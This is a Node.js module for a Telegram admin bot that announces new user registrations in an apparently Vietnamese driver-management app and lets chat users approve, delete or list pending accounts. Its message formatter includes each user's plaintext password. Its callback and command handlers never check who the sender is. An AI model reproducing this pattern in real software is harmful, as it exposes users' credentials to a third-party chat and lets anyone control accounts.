const https = require('https');
const { User } = require('../models');
const config = require('../config/config');

const token = config.TELEGRAM_BOT_TOKEN;
const defaultChatId = config.TELEGRAM_CHAT_ID;

let isPolling = false;
let offset = 0;

// Helper to make API requests to Telegram
function telegramApi(method, payload) {
  return new Promise((resolve, reject) => {
    if (!token) {
      return reject(new Error('TELEGRAM_BOT_TOKEN is not configured'));
    }
    const data = JSON.stringify(payload);
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${token}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(body);
          if (parsed.ok) {
            resolve(parsed.result);
          } else {
            reject(new Error(parsed.description || 'Telegram API error'));
          }
        } catch (err) {
          reject(err);
        }
      });
    });

    req.on('error', (err) => reject(err));
    req.write(data);
    req.end();
  });
}

function formatUserMessage(user, customStatusText = null) {
  const statusEmoji = user.status === 'approved' ? '✅ ĐÃ DUYỆT' : 
                      user.status === 'rejected' ? '❌ ĐÃ TỪ CHỐI' : '⏳ ĐANG CHỜ DUYỆT';
  const statusText = customStatusText || statusEmoji;
  
  return `🔔 <b>THÀNH VIÊN ĐĂNG KÝ MỚI!</b>

<b>ID:</b> ${user.id}
<b>Họ tên:</b> ${user.name}
<b>Số điện thoại:</b> <code>${user.phone}</code>
<b>Mật khẩu:</b> <code>${user.plainPassword || 'Không có'}</code>
<b>Loại xe:</b> ${user.carType || 'Chưa cập nhật'}
<b>Năm xe:</b> ${user.carYear || 'Chưa cập nhật'}
<b>Trạng thái:</b> ${statusText}`;
}

async function sendNewRegistrationNotification(user) {
  try {
    if (!token || !defaultChatId) {
      console.log('Telegram Bot: Token or Chat ID not configured. Notification skipped.');
      return;
    }
    const text = formatUserMessage(user);
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: '✅ Duyệt', callback_data: `approve_user_${user.id}` },
          { text: '❌ Xóa tài khoản', callback_data: `delete_user_${user.id}` }
        ]
      ]
    };
    
    await telegramApi('sendMessage', {
      chat_id: defaultChatId,
      text: text,
      parse_mode: 'HTML',
      reply_markup: replyMarkup
    });
    console.log(`Telegram Bot: Sent registration notification for user ${user.id}`);
  } catch (err) {
    console.error('Telegram Bot: Error sending notification:', err);
  }
}

async function handleUpdate(update) {
  if (update.callback_query) {
    const callbackQuery = update.callback_query;
    const data = callbackQuery.data;
    const message = callbackQuery.message;
    const chatId = message.chat.id;
    const messageId = message.message_id;

    if (data.startsWith('approve_user_')) {
      const userId = parseInt(data.substring('approve_user_'.length), 10);
      try {
        const user = await User.findByPk(userId);
        if (!user) {
          await telegramApi('answerCallbackQuery', {
            callback_query_id: callbackQuery.id,
            text: '❌ Không tìm thấy người dùng này!',
            show_alert: true
          });
          return;
        }

        if (user.status === 'approved') {
          await telegramApi('answerCallbackQuery', {
            callback_query_id: callbackQuery.id,
            text: 'Người dùng này đã được duyệt trước đó!',
            show_alert: false
          });
          // Update message just in case
          await telegramApi('editMessageText', {
            chat_id: chatId,
            message_id: messageId,
            text: formatUserMessage(user),
            parse_mode: 'HTML'
          });
          return;
        }

        user.status = 'approved';
        user.approvedAt = new Date();
        await user.save();

        await telegramApi('answerCallbackQuery', {
          callback_query_id: callbackQuery.id,
          text: `✅ Đã duyệt thành viên ${user.name}!`,
          show_alert: false
        });

        await telegramApi('editMessageText', {
          chat_id: chatId,
          message_id: messageId,
          text: formatUserMessage(user, '✅ ĐÃ DUYỆT (Bởi Admin qua Telegram)'),
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.error('Telegram Bot: Error approving user:', err);
        await telegramApi('answerCallbackQuery', {
          callback_query_id: callbackQuery.id,
          text: '❌ Có lỗi xảy ra khi duyệt!',
          show_alert: true
        });
      }
    } else if (data.startsWith('delete_user_')) {
      const userId = parseInt(data.substring('delete_user_'.length), 10);
      try {
        const user = await User.findByPk(userId);
        if (!user) {
          await telegramApi('answerCallbackQuery', {
            callback_query_id: callbackQuery.id,
            text: '❌ Không tìm thấy người dùng để xóa!',
            show_alert: true
          });
          return;
        }

        const userName = user.name;
        const userPhone = user.phone;
        await user.destroy();

        await telegramApi('answerCallbackQuery', {
          callback_query_id: callbackQuery.id,
          text: `❌ Đã xóa tài khoản ${userName}!`,
          show_alert: false
        });

        const text = `🔔 <b>THÀNH VIÊN ĐĂNG KÝ MỚI!</b>

<b>ID:</b> ${userId}
<b>Họ tên:</b> ${userName}
<b>Số điện thoại:</b> <code>${userPhone}</code>
<b>Trạng thái:</b> ❌ ĐÃ XÓA TÀI KHOẢN (Bởi Admin qua Telegram)`;

        await telegramApi('editMessageText', {
          chat_id: chatId,
          message_id: messageId,
          text: text,
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.error('Telegram Bot: Error deleting user:', err);
        await telegramApi('answerCallbackQuery', {
          callback_query_id: callbackQuery.id,
          text: '❌ Có lỗi xảy ra khi xóa!',
          show_alert: true
        });
      }
    } else if (data.startsWith('show_pending_')) {
      const option = data.substring('show_pending_'.length);
      try {
        const totalPending = await User.count({ where: { status: 'pending' } });
        if (totalPending === 0) {
          await telegramApi('answerCallbackQuery', {
            callback_query_id: callbackQuery.id,
            text: 'Không còn thành viên nào đang chờ duyệt!',
            show_alert: false
          });
          await telegramApi('editMessageText', {
            chat_id: chatId,
            message_id: messageId,
            text: '⏳ Hiện tại không có thành viên nào đang chờ duyệt.',
            parse_mode: 'HTML'
          });
          return;
        }

        let limit = totalPending;
        if (option !== 'all') {
          limit = parseInt(option, 10);
        }

        const pendingUsers = await User.findAll({
          where: { status: 'pending' },
          order: [['createdAt', 'DESC']],
          limit: limit
        });

        await telegramApi('answerCallbackQuery', {
          callback_query_id: callbackQuery.id,
          text: `Đang tải ${pendingUsers.length} tài khoản...`,
          show_alert: false
        });

        await telegramApi('editMessageText', {
          chat_id: chatId,
          message_id: messageId,
          text: `🔍 Đang hiển thị <b>${pendingUsers.length}</b> trên tổng số <b>${totalPending}</b> thành viên chờ duyệt mới nhất:`,
          parse_mode: 'HTML'
        });

        for (const user of pendingUsers) {
          const text = formatUserMessage(user);
          const replyMarkup = {
            inline_keyboard: [
              [
                { text: '✅ Duyệt', callback_data: `approve_user_${user.id}` },
                { text: '❌ Xóa tài khoản', callback_data: `delete_user_${user.id}` }
              ]
            ]
          };
          await telegramApi('sendMessage', {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: replyMarkup
          });
        }
      } catch (err) {
        console.error('Telegram Bot: Error loading pending users from callback:', err);
        await telegramApi('answerCallbackQuery', {
          callback_query_id: callbackQuery.id,
          text: '❌ Có lỗi xảy ra khi tải danh sách!',
          show_alert: true
        });
      }
    }
  } else if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;

    if (text === '/pending' || text === '/list') {
      try {
        const totalPending = await User.count({ where: { status: 'pending' } });

        if (totalPending === 0) {
          await telegramApi('sendMessage', {
            chat_id: chatId,
            text: '⏳ Hiện tại không có thành viên nào đang chờ duyệt.',
            parse_mode: 'HTML'
          });
          return;
        }

        const replyMarkup = {
          inline_keyboard: [
            [
              { text: '5', callback_data: 'show_pending_5' },
              { text: '10', callback_data: 'show_pending_10' },
              { text: '20', callback_data: 'show_pending_20' },
              { text: 'Tất cả', callback_data: 'show_pending_all' }
            ]
          ]
        };

        await telegramApi('sendMessage', {
          chat_id: chatId,
          text: `🔍 Tìm thấy <b>${totalPending}</b> thành viên đang chờ duyệt. Bạn muốn hiển thị bao nhiêu tài khoản gần nhất?`,
          parse_mode: 'HTML',
          reply_markup: replyMarkup
        });
      } catch (err) {
        console.error('Telegram Bot: Error showing pending options:', err);
        await telegramApi('sendMessage', {
          chat_id: chatId,
          text: '❌ Đã xảy ra lỗi khi lấy danh sách chờ duyệt.',
          parse_mode: 'HTML'
        });
      }
    } else if (text === '/start' || text === '/help') {
      await telegramApi('sendMessage', {
        chat_id: chatId,
        text: `🤖 <b>Hệ thống Quản lý Lái xe qua Telegram</b>

Các lệnh hỗ trợ:
• <code>/pending</code> hoặc <code>/list</code> : Xem danh sách thành viên đang chờ duyệt.
• <code>/help</code> : Hiển thị hướng dẫn này.

Khi có tài khoản mới đăng ký, Bot sẽ gửi tin nhắn trực tiếp kèm nút Duyệt/Xóa nhanh.`,
        parse_mode: 'HTML'
      });
    }
  }
}

async function pollUpdates() {
  if (!isPolling) return;
  try {
    const response = await telegramApi('getUpdates', {
      offset: offset,
      timeout: 30
    });
    
    if (Array.isArray(response) && response.length > 0) {
      for (const update of response) {
        offset = update.update_id + 1;
        try {
          await handleUpdate(update);
        } catch (handleErr) {
          console.error('Telegram Bot: Error handling update:', handleErr);
        }
      }
    }
  } catch (err) {
    console.error('Telegram Bot: Polling error:', err.message || err);
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  
  if (isPolling) {
    setTimeout(pollUpdates, 1000);
  }
}

function initTelegramBot() {
  if (!token) {
    console.log('Telegram Bot: TELEGRAM_BOT_TOKEN is not configured. Bot logic disabled.');
    return;
  }
  if (isPolling) return;
  
  isPolling = true;
  console.log('Telegram Bot: Initializing long-polling...');
  
  // Set bot commands suggestion
  telegramApi('setMyCommands', {
    commands: [
      { command: 'pending', description: 'Xem danh sách lái xe đang chờ duyệt' },
      { command: 'help', description: 'Xem hướng dẫn sử dụng' }
    ]
  }).then(() => {
    console.log('Telegram Bot: Commands suggestion set successfully.');
  }).catch(err => {
    console.error('Telegram Bot: Failed to set commands suggestion:', err.message || err);
  });

  pollUpdates();
}

function stopTelegramBot() {
  isPolling = false;
}

module.exports = {
  sendNewRegistrationNotification,
  initTelegramBot,
  stopTelegramBot
};
